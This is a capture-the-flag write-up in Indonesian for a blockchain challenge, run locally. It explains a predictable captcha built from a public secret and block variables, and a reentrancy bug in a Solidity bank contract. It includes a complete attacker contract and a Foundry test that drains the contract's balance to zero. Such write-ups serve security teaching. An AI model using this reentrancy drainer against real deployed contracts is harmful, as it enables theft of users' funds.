# Unsolveable Money Captcha **[Local Simulation]**

## Overview

* **Judul**: Unsolveable Money Captcha
* **Kategori**: Blockchain
* **Poin**: 1000 pts
* **Author**: Dimas Maulana
* **Deskripsi**: Tantangan untuk menguras kontrak yang dilindungi oleh sistem "Captcha" yang diklaim sulit dipecahkan.
* **URL**: `https://gzcli.1pc.tf/tcp1p-ctf-2024-archive-blockchain-unsolveable-money-captcha` (Archive)

## Informasi Attachment

File yang diberikan:

* `Captcha.sol`: Kontrak generator Captcha.
* `Money.sol`: Kontrak penyimpanan uang (Bank).
* `Setup.sol`: Kontrak deployment.

## Analisis Vulnerability

Terdapat dua celah keamanan (Chained Vulnerability) yang dieksploitasi:

### 1. Weak Randomness & Visible Secret (Captcha Bypass)

Mekanisme captcha bersifat deterministik dan dapat diprediksi dalam satu transaksi yang sama.

* **Money.sol**: Variabel `secret` bersifat `public`, sehingga bisa dibaca oleh kontrak lain.
```solidity
uint256 public immutable secret;

```


* **Captcha.sol**: Captcha digenerate menggunakan variabel global blok yang konstan selama eksekusi transaksi (`block.number`, `block.timestamp`).
```solidity
function generateCaptcha(uint256 _secret) external returns (uint256) {
    uint256 captcha = uint256(keccak256(abi.encodePacked(_secret, block.number, block.timestamp)));
    // ...
}

```


**Exploit**: Attacker bisa membaca `secret` dan menghitung captcha yang valid secara *on-chain* di dalam transaksi serangan.

### 2. Reentrancy Attack

Fungsi `load` pada `Money.sol` melanggar pola *Checks-Effects-Interactions*.

```solidity
function load(uint256 userProvidedCaptcha) public {
    // ... Check Balance & Captcha ...

    // [VULNERABILITY] External Call dilakukan SEBELUM update state
    (bool success,) = msg.sender.call{value: balance}(""); 
    require(success, 'Oh my god, what is that!?');
    
    // [LATE UPDATE] Saldo baru dinolkan setelah transfer selesai
    balances[msg.sender] = 0; 
}

```

**Exploit**: Karena saldo `balances[msg.sender]` baru di-set ke 0 setelah uang dikirim, Attacker dapat menggunakan fungsi `receive()` untuk memanggil kembali fungsi `load()` secara rekursif sebelum saldo diupdate.

## Proses Eksploitasi

1. **Deploy Malicious Contract**: Membuat kontrak yang bisa berinteraksi dengan `Money` dan `Captcha`.
2. **Initial Deposit**: Mengirim 1 Ether ke kontrak `Money` agar lolos validasi `require(balance > 0)`.
3. **Trigger Withdraw**: Memanggil fungsi `load()` pertama kali dengan captcha yang dihitung secara *real-time*.
4. **Reentrancy Loop**:
* Saat `Money` mengirim Ether, fungsi `receive()` pada Attacker aktif.
* Di dalam `receive()`, kita cek jika saldo `Money` masih ada.
* Jika ya, kita panggil `load()` lagi (Re-entry).
* Karena masih dalam blok yang sama, kalkulasi captcha tetap valid.


5. **Drain**: Proses berulang hingga saldo kontrak target 0.

## Script Solver (`test/Local-Solve.t.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Setup.sol";
import "../src/Money.sol";
import "../src/Captcha.sol";

contract Attacker {
    Money money;
    Captcha captcha;
    
    constructor(address _money, address _captcha) {
        money = Money(_money);
        captcha = Captcha(_captcha);
    }

    function attack() external payable {
        // 1. Deposit modal awal
        money.save{value: 1 ether}();
        // 2. Trigger serangan
        withdraw();
    }

    function withdraw() internal {
        // Bypass Captcha: Baca secret public & generate captcha valid
        uint256 secret = money.secret(); 
        uint256 validCaptcha = captcha.generateCaptcha(secret);
        
        // Panggil load
        money.load(validCaptcha);
    }

    // Exploit Reentrancy saat terima Ether
    receive() external payable {
        if (address(money).balance > 0) {
            withdraw();
        }
    }
}

contract LocalSolve is Test {
    Setup setup;
    Money money;
    Captcha captcha;
    address hacker = makeAddr("hacker");

    function setUp() public {
        setup = new Setup{value: 100 ether}();
        money = setup.moneyContract();
        captcha = setup.captchaContract();
        vm.deal(hacker, 5 ether);
    }

    function test_Exploit() public {
        vm.startPrank(hacker);

        console.log("=== START ATTACK ===");
        console.log("Money Contract Balance (Initial):", address(money).balance);

        Attacker attacker = new Attacker(address(money), address(captcha));
        attacker.attack{value: 1 ether}();

        vm.stopPrank();

        console.log("=== END ATTACK ===");
        console.log("Money Contract Balance (Final):", address(money).balance);
        
        assertTrue(setup.isSolved(), "GAGAL: Money contract belum kosong!");
    }
}

```

## Output Terminal

```bash
$ forge test --match-path test/Local-Solve.t.sol -vv

[PASS] test_Exploit() (gas: 484816)
Logs:
  === START ATTACK ===
  Money Contract Balance (Initial): 10000000000000000000
  === END ATTACK ===
  Money Contract Balance (Final): 0

```
